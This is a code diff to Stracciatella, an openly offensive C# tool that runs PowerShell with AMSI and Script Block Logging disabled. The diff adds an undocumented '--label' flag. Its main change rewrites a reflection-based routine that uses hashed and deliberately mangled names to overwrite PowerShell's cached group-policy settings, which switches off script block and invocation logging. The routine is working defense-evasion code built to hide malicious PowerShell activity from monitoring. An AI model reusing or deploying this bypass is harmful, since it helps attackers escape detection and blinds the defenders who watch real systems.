@@ -12,6 +12,7 @@ using System.Collections.Generic;
 using System.IO.Pipes;
 using System.Security.Principal;
 using System.Security.AccessControl;
+using System.Collections;
 
 namespace Stracciatella
 {
@@ -69,8 +70,8 @@ namespace Stracciatella
         {
             Console.WriteLine("");
             Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.");
-            Console.WriteLine("  Mariusz Banach / mgeeky, '19-21 <mb@binary-offensive.com>");
-            Console.WriteLine("  v0.5");
+            Console.WriteLine("  Mariusz Banach / mgeeky, '19-22 <mb@binary-offensive.com>");
+            Console.WriteLine("  v0.6");
             Console.WriteLine("");
         }
 
@@ -222,6 +223,24 @@ namespace Stracciatella
                     options.ScriptPath = p;
                     processed.Add(arg);
                     processed.Add(args[i + 1]);
+                    i += 1;
+                }
+                else if (string.Equals(arg, "-l") || string.Equals(arg, "--label"))
+                {
+                    //
+                    // Undocumented parameter "label".
+                    // Used only to satisfy BOF.NET bofnet_jobs output displaying executed assembly's Args.
+                    // Not to be used directly. Does nothing.
+                    //
+
+                    if (args.Length - 1 < i + 1)
+                    {
+                        throw new ArgumentException("No value for label.");
+                    }
+
+                    processed.Add(arg);
+                    processed.Add(args[i + 1]);
+                    processedopts += 2;
                     i += 1;
                 }
             }
@@ -436,56 +455,21 @@ namespace Stracciatella
 
         public static bool DisableScriptLogging(PowerShell rs)
         {
-            bool ret = false;
-            string param = "";
-            ret |= DisableScriptLoggingTechnique1(rs, ref param);
-            ret |= DisableScriptLoggingTechnique2(rs, param);
-            return ret;
-        }
-
-        public static bool DisableScriptLoggingTechnique1(PowerShell rs, ref string param)
-        {
-            AppDomain currentDomain = AppDomain.CurrentDomain;
-            Assembly[] assems = currentDomain.GetAssemblies();
-
-            foreach (Assembly assem in assems)
+            try
             {
-                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
-                {
-                    Type[] types = assem.GetTypes();
-                    foreach (var tp in types)
-                    {
-                        if (GetHash(tp.Name) == 12579468197) // UXtils
-                        {
-                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
-                            foreach (var f in fields)
-                            {
-                                if (GetHash(f.Name) == 12250760746)
-                                {
-                                    HashSet<string> names = (HashSet<string>)f.GetValue(null);
-                                    foreach (var n in names)
-                                    {
-                                        if (GetHash(n) == 32086076268) // ScrXiptBloXckLogXging
-                                        {
-                                            param = n;
-                                            break;
-                                        }
-                                    }
-
-                                    // https://cobXXXbr.io/ScrXXXiptBlock-Warning-Event-Logging-BypXXXass.html
-                                    f.SetValue(null, new HashSet<string>(StringComparer.OrdinalIgnoreCase) { });
-                                    return true;
-                                }
-                            }
-                        }
-                    }
-                }
+                bool ret = false;
+                ret |= DisableScriptLoggingTechnique1(rs);
+                return ret;
             }
-
-            return false;
+            catch (Exception e)
+            {
+                Console.WriteLine($"[!] Could not disable Script Block Logging. Unhandled exception occured:\n{e}");
+                return false;
+            }
         }
 
-        public static bool DisableScriptLoggingTechnique2(PowerShell rs, string param)
+
+        public static bool DisableScriptLoggingTechnique1(PowerShell rs)
         {
             AppDomain currentDomain = AppDomain.CurrentDomain;
             Assembly[] assems = currentDomain.GetAssemblies();
@@ -495,67 +479,55 @@ namespace Stracciatella
                 if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                 {
                     Type[] types = assem.GetTypes();
+                    string key = "";
+                    string param = "";
+
                     foreach (var tp in types)
                     {
-                        if (GetHash(tp.Name) == 12579468197) // UXtils
+                        // 12579468197 - ScriXptBloXck
+                        if (GetHash(tp.Name) == 4572158998) // UXtils
                         {
                             var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                             FieldInfo field = null;
                             foreach (var f in fields)
                             {
-                                if (GetHash(f.Name) == 52485150955) // caXchedGrXoupPoXlicySettXings
+                                if (GetHash(f.Name) == 52485150955) // cachXedGrXoupPoXlicySetXtings
                                 {
-                                    field = f;
-                                    break;
-                                }
-                            }
+                                    var cached = (System.Collections.Concurrent.ConcurrentDictionary<string, System.Collections.Generic.Dictionary<string, object>>)f.GetValue(null);
 
-                            if(field != null)
-                            {
-                                Dictionary<string, object> cached = (Dictionary<string, object>)field.GetValue(null);
-                                string key = param;
-
-                                if (key.Length == 0)
-                                {
-                                    foreach (string k in cached.Keys)
+                                    foreach (string n in cached.Keys)
                                     {
-                                        if (GetHash(k) == 32086076268) // ScrXiptBloXckLogXging
+                                        string val = n;
+                                        if (val.Contains("\\"))
                                         {
-                                            key = k;
-                                            break;
+                                            var pos = val.LastIndexOf("\\");
+                                            if (pos > 0 && pos + 1 < val.Length)
+                                            {
+                                                val = val.Substring(pos + 1);
+                                            }
+                                        }
+
+                                        if (GetHash(val) == 32086076268) // ScrXiptBloXckLogXging
+                                        {
+                                            param = val;
+                                            key = n;
+
+                                            if (key.Length > 0 && cached[key] != null)
+                                            {
+                                                var cached2 = new System.Collections.Generic.Dictionary<string, object>();
+
+                                                cached2[$"Enable{param}"] = 0;
+                                                cached2[$"Enable{param.Replace("kL", "kInvocationL")}"] = 0;
+
+                                                cached[key] = cached2;
+
+                                                f.SetValue(null, cached);
+                                            }
+
+                                            return true;
                                         }
                                     }
                                 }
-
-                                if(key.Length > 0 && cached[key] != null)
-                                {
-                                    Dictionary<string, object> cached2 = (Dictionary<string, object>)cached[key];
-                                    string k2 = "";
-                                    string k3 = "";
-
-                                    foreach (string k in cached2.Keys)
-                                    {
-                                        if (GetHash(k) == 45083803091) // EnabXleScrXiptBloXckLogXging
-                                        {
-                                            k2 = k;
-                                        }
-                                        else if (GetHash(k) == 70211596397) // EnabXleScrXiptBloXckInvocXationLogXging
-                                        {
-                                            k3 = k;
-                                        }
-                                    }
-
-                                    if (k2.Length > 0 && cached2[k2] != null) cached2[k2] = 0;
-                                    if (k3.Length > 0 && cached2[k3] != null) cached2[k3] = 0;
-                                }
-
-                                var newCache = new Dictionary<string, object>();
-                                newCache.Add($"Enable{param}", 0);
-                                string param2 = param.Replace("kL", "kInvocationL");
-                                newCache.Add($"Enable{param2}", 0);
-                                cached[$"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\{param}"] = newCache;
-
-                                return true;
                             }
                         }
                     }
@@ -676,6 +648,13 @@ namespace Stracciatella
 
                     if(!silent) Info($"PS> {command}");
 
+                    if (command.Length == 0)
+                    {
+                        if(!silent) Info($"(no command given)");
+                        return "";
+                    }
+
+                    //pipe.Commands.AddScript("& { " + command + "} *>&1");
                     pipe.Commands.AddScript(command);
                     pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                     if(addOutDefault) pipe.Commands.Add("Out-default");
@@ -686,6 +665,7 @@ namespace Stracciatella
 
                         output = ((CustomPSHostUserInterface)host.UI).Output;
                         ((CustomPSHostUserInterface)host.UI)._sb = new StringBuilder();
+
                         command = "";
                     }
                     catch (Exception e)
@@ -694,6 +674,7 @@ namespace Stracciatella
                     }
                 }
             }
+
             return output;
         }
 
